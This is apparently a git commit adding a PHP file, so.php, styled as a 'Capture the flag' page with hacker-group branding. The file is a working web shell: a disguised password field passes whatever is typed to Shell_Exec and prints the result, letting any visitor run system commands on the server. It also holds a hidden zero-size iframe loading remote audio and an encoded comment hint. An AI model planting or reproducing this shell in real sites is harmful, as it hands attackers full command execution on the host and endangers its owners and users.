99a82880c486f407be255ecfaf40d84b279070f8
Indcyberjoker <cyberdefencely@gmail.com>
2016-10-21 14:33:12 +0530

    Add files via upload

---
+++ so.php
@@ -0,0 +1,31 @@
+<html>
+<head>
+<title>Capture the flag</title>
+</head>
+<center>
+</span><font color="blue"><h1>Only 2 page codes and my hours of works :P <br>Hope u like It<br>Thank You <br>!~Indcyberjoker~!</h1></font><a
+href="https://www.facebook.com/TeamHindHackers/">Facebook</a></center>
+<center><iframe width="0" height="0" src="http://hd.blugaa.com/66c3a5559a37cc13efbac0ef09ab298a/yxduv/Ankhiyan%20ft%20Tony%20Kakkar-%28Mr-Jatt.com%29.mp3" frameborder="0"></iframe><br><br><img style="width: 470px; height: 470px;" alt="hk"
+src="http://www.bahasaent.com/FLAG/gov.jpg"></center>
+<center>
+</body>
+
+<body bgcolor=#000000 text=#ffffff ">
+
+<form method=POST>
+<input type=password name="Indcyberjocker" name="username"  size=8 value="<?=$cmd?>" 
+style="background:#000000;color:#ffffff;">
+<hr>
+<font color="blue"><h1>Thank You<br>Enjoy The Codes<br>Indcyberjocker</h1></font><center>
+<pre>
+<? $cmd = $_REQUEST["Indcyberjocker"];?>
+<? if($cmd != "") print Shell_Exec($cmd);?>
+</center></pre>
+</form>
+</body>
+</html
+
+
+
+
+<!-- %48%69%6e%64%48%69%6e%74%2e%74%78%74  --!>
